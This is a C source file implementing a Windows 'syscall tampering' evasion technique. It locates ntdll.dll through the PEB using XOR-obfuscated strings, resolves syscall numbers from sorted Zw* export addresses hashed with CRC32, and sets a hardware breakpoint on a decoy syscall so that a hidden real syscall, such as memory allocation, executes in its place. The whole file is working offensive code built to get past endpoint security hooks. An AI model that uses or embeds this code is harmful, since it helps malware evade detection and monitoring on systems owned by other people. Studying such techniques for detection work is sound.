#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#include "HardwareBreakPoint.h"
#include "SyscallTampering.h"

// ==========================================================================================================================

SYSCALL_ENTRY_LIST g_EntriesList = { 0x00 };

// ==========================================================================================================================

UINT32 CRC32BA(IN LPCSTR String){

	UINT32      uMask	= 0x00,
				uHash	= 0xFFFFEFFF;
	INT         i		= 0x00;

	while (String[i] != 0) {

		uHash = uHash ^ (UINT32)String[i];

		for (int ii = 0; ii < 8; ii++) {

			uMask = -1 * (uHash & 1);
			uHash = (uHash >> 1) ^ (0xEDB88320 & uMask);
		}

		i++;
	}

	return ~uHash;
}

#define HASH(STR)(CRC32BA(STR))

// ==========================================================================================================================

// Sorting By System Call Address - https://github.com/jthuraisamy/SysWhispers2/blob/main/example-output/Syscalls.c#L32

volatile DWORD g_NTDLLSTR1 = 0x46414163;	// 'ldtn' ^ 0x2A25350D = 0x6C64746E ^ 0x2A25350D
volatile DWORD g_NTDLLSTR2 = 0x4643Eb76;	// 'ld.l' ^ 0x2A27C51A = 0x6C642E6C ^ 0x2A27C51A

BOOL PopulateSyscallList() {

	if (g_EntriesList.dwEntriesCount)
		return TRUE;

#if defined(_WIN64)
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
	
	PLDR_DATA_TABLE_ENTRY		pDataTableEntry				= NULL;
	PIMAGE_NT_HEADERS			pImgNtHdrs					= NULL;
	PIMAGE_EXPORT_DIRECTORY		pExportDirectory			= NULL;
	ULONG_PTR					uNtdllBase					= NULL;
	PDWORD						pdwFunctionNameArray		= NULL;
	PDWORD						pdwFunctionAddressArray		= NULL;
	PWORD						pwFunctionOrdinalArray		= NULL;

	// Fetch ntdll.dll base address
	for (pDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pPeb->Ldr->Reserved2[1]; pDataTableEntry->DllBase != NULL; pDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pDataTableEntry->Reserved1[0]) {
		
		pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)pDataTableEntry->DllBase + ((PIMAGE_DOS_HEADER)pDataTableEntry->DllBase)->e_lfanew);
		if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
			break;

		pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)pDataTableEntry->DllBase + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

		if (((*(ULONG*)((ULONG_PTR)pDataTableEntry->DllBase + pExportDirectory->Name)) | 0x20202020) != (g_NTDLLSTR1 ^ 0x2A25350D))
			continue;

		if (((*(ULONG*)((ULONG_PTR)pDataTableEntry->DllBase + pExportDirectory->Name + 0x04)) | 0x20202020) == (g_NTDLLSTR2 ^ 0x2A27C51A)) {
			uNtdllBase = (ULONG_PTR)pDataTableEntry->DllBase;
			break;
		}
	}

	if (!uNtdllBase)
		return FALSE;

	pdwFunctionNameArray	= (PDWORD)(uNtdllBase + pExportDirectory->AddressOfNames);
	pdwFunctionAddressArray	= (PDWORD)(uNtdllBase + pExportDirectory->AddressOfFunctions);
	pwFunctionOrdinalArray	= (PWORD)(uNtdllBase + pExportDirectory->AddressOfNameOrdinals);

	// Store Zw* syscalls addresses
	for (int i = 0; i < pExportDirectory->NumberOfNames; i++){

		CHAR* pFunctionName = (CHAR*)(uNtdllBase + pdwFunctionNameArray[i]);
		
		if (*(unsigned short*)pFunctionName == 'wZ' && g_EntriesList.dwEntriesCount <= MAX_ENTRIES) {
			g_EntriesList.Entries[g_EntriesList.dwEntriesCount].u32Hash		= HASH(pFunctionName);
			g_EntriesList.Entries[g_EntriesList.dwEntriesCount].uAddress	= (ULONG_PTR)(uNtdllBase + pdwFunctionAddressArray[pwFunctionOrdinalArray[i]]);
			g_EntriesList.dwEntriesCount++;
		}
	}

	// Sort Zw* syscalls addresses in ascending order
	for (int i = 0; i < g_EntriesList.dwEntriesCount - 0x01; i++){

		for (int j = 0; j < g_EntriesList.dwEntriesCount - i - 0x01; j++){

			if (g_EntriesList.Entries[j].uAddress > g_EntriesList.Entries[j + 1].uAddress) {
			
				SYSCALL_ENTRY TempEntry = { .u32Hash = g_EntriesList.Entries[j].u32Hash, .uAddress = g_EntriesList.Entries[j].uAddress };

				g_EntriesList.Entries[j].u32Hash		=	g_EntriesList.Entries[j + 1].u32Hash;
				g_EntriesList.Entries[j].uAddress		=	g_EntriesList.Entries[j + 1].uAddress;

				g_EntriesList.Entries[j + 1].u32Hash	=	TempEntry.u32Hash;
				g_EntriesList.Entries[j + 1].uAddress	=	TempEntry.uAddress;

			}
		}
	}

	return TRUE;
}

// ==========================================================================================================================

// Fetching SSN - https://github.com/jthuraisamy/SysWhispers2/blob/main/example-output/Syscalls.c#L128

DWORD FetchSSNFromSyscallEntries(IN UINT32 uCRC32FunctionHash) {

	if (!PopulateSyscallList())
		return 0x00;

	for (DWORD i = 0x00; i < g_EntriesList.dwEntriesCount; i++) {
		if (uCRC32FunctionHash == g_EntriesList.Entries[i].u32Hash)
			return i;
	}

	return 0x00;
}

// ==========================================================================================================================

/*
	InitializeTamperedSyscall:
		* Sets a Hardware Breakpoint at the syscall instruction address of the "uCalledSyscallAddress" syscall.
		* Fetches the SSN of the real function to be executed using its hash (uCRC32FunctionHash).
		* Calls "PassParameters" to initialize uCRC32FunctionHash's first 4 parameters that were passed as NULL when calling "uCalledSyscallAddress".

	Parms:
		* uCalledSyscallAddress - Address of the decoy syscall to be called (e.g. NtQuerySecurityObject).
		* uCRC32FunctionHash - CRC hash of the real syscall to be executed (e.g. ZwAllocateVirtualMemory).
		* uParm1->4 - First 4 parameters of the real syscall to be executed (e.g. ZwAllocateVirtualMemory).
*/

volatile unsigned short g_SYSCALL_OPCODE = 0x262A;	// 0x050F ^ 0x2325

BOOL InitializeTamperedSyscall(IN ULONG_PTR uCalledSyscallAddress, IN UINT32 uCRC32FunctionHash, IN ULONG_PTR uParm1, IN ULONG_PTR uParm2, IN ULONG_PTR uParm3, IN ULONG_PTR uParm4) {

	if (!uCalledSyscallAddress || !uCRC32FunctionHash)
		return FALSE;

	PVOID	pDecoySyscallInstructionAdd	= NULL;
	DWORD	dwRealSyscallNumber			= 0x00;

	for (int i = 0; i < 0x20; i++) {

		if (*(unsigned short*)(uCalledSyscallAddress + i) == (g_SYSCALL_OPCODE ^ 0x2325)) {
			pDecoySyscallInstructionAdd = (PVOID)(uCalledSyscallAddress + i);
			break;
		}
	}

	if (!pDecoySyscallInstructionAdd)
		return FALSE;

	if (!(dwRealSyscallNumber = FetchSSNFromSyscallEntries(uCRC32FunctionHash)))
		return FALSE;

	PassParameters(uParm1, uParm2, uParm3, uParm4, dwRealSyscallNumber);

	if (!InstallHardwareBPHook(GetCurrentThreadId(), pDecoySyscallInstructionAdd))
		return FALSE;

	return TRUE;
}